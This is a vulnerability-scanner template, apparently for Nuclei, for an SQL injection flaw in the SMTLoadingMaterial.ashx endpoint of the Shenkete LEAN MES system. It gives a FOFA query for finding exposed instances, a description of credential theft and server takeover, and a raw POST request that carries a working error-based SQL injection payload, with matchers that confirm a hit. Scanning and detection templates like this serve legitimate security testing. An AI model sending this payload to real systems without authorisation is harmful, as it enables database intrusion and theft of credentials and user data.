id: shenkete-LEAN-MES-SMTLoadingMaterial-sql

info:
  name: "深科特LEAN MES系统SMTLoadingMaterial接口SQL注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: (title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png")
      深科特LEAN MES系统SMTLoadingMaterial接口存在SQL注入漏洞，攻击者可通过此漏洞绕过身份验证机制，执行恶意SQL语句实现数据库敏感信息读取（包括但不限于管理员凭据、用户隐私数据）及服务器权限提升。在具备高权限访问条件下，可向目标系统部署恶意代码，最终达成对服务器的完全控制。
  reference:
  - https://mp.weixin.qq.com/s/Suh9xcz8yo9250Dr4aPocg
  tags: 深科特LEAN

http:
- raw:
  - |
    POST /handler/SMTLoadingMaterial.ashx HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br, zstd
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Connection: keep-alive

    type=GetOrderList&PlanOrderNo=1%27+AND+9304+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289304%3D9304%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--+keHv

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'qbqbq1qvkxq'
  - type: status
    status:
    - 500
